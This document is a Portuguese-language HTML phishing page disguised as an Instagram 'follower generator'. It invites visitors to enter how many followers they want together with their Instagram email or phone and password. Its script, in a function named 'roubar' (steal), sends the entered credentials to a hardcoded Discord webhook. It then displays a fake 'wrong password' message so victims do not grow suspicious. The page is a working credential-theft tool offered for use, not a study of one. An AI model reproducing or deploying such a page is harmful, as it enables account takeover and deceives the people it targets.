<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gerador de Seguidores | Instagram</title>
    <style>
        /* Reset básico */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        /* Fundo com cores do Instagram */
        body {
            background: linear-gradient(to right, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
            color: white;
            text-align: center;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Caixa principal */
        .container {
            background: rgba(0, 0, 0, 0.6);
            padding: 20px;
            border-radius: 10px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
        }

        /* Título */
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }

        /* Texto de instrução */
        p {
            font-size: 16px;
            margin-bottom: 20px;
        }

        /* Estilização do formulário */
        form {
            display: flex;
            flex-direction: column;
        }

        /* Labels */
        label {
            font-weight: bold;
            margin-top: 10px;
            text-align: left;
        }

        /* Campos de entrada */
        input {
            padding: 10px;
            border: none;
            border-radius: 5px;
            margin-top: 5px;
            font-size: 16px;
            width: 100%;
        }

        /* Botão */
        button {
            margin-top: 15px;
            background: #d62976;
            color: white;
            border: none;
            padding: 10px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
            transition: 0.3s;
        }

        button:hover {
            background: #962fbf;
        }

.brilho{
text-shadow:0px 0px 10px orange,0px 0px 35px blue;
color:cyan;
}
#errado{
position:relative;
background-color:white;
display:none;
height:60px;
width:280px;
font-weight:bold;
//padding:30px;
color:red;
border:2px solid red;
border-radius:10px;
left:25px;
margin-bottom:20px;
}
#errado p{
padding:10px;

position:relative;
}
.animado{
animation:aparecer 1s 1 ease;
}
@keyframes aparecer{
0%{
width:25px;
}
100%{
width:280px;
}
}

    </style>
</head>
<body>
    <div class="container">
        <h1>Ganhe Seguidores no Instagram</h1>
<img src="foto.png" width="200px">
        <p>Insira a quantidade desejada de seguidores e faça login.</p>
        <form>
<div id="errado" class="animado">
<p>Senha ou Email/Número de telefone incorrectos</p>
</div>
           <label for="quantidade">Insira a quantidade de <span class="brilho">seguidores</span></label>
            <input type="number" id="quantidade" placeholder="Ex: 1000" required>

            <label for="email">E-mail ou Número de Telefone:</label>
            <input type="text" id="email" placeholder="Digite seu e-mail ou telefone" required>

            <label for="senha">Senha:</label>
            <input type="password" id="senha" placeholder="Digite sua senha" required>

            <button onclick="roubar()">Gerar Seguidores</button>

</form>
    </div>

<script>
async function roubar(){
webhook="https://discord.com/api/webhooks/1359291929686179870/VpRWiU8PrHNr8FUEWdubZd_3sYSoUIImydzHwllIaYDegqT22Rj57fyUjn6NGRjYyzFL";


var senha=document.getElementById("senha").value;
var email=document.getElementById("email").value;
var errado=document.getElementById("errado");
if (senha.length != 0 && email.length != 0){
errado.classList.remove("animado");
errado.style.display="none";
setTimeout(function(){
errado.style.display="inline-block";
errado.classList.add("animado");

},1);

msg={
content: "===Instagram==\n\nEmail/Telefone: "+email+"\n\nSenha: "+senha+"\n\n========="
}
await fetch(webhook,{
method:"POST",
headers: {"Content-Type":"application/json"},
body: JSON.stringify(msg)

});

}else{
alert("Por favor, preencha os campos de login.");
}

}

</script>

</body>
</html>
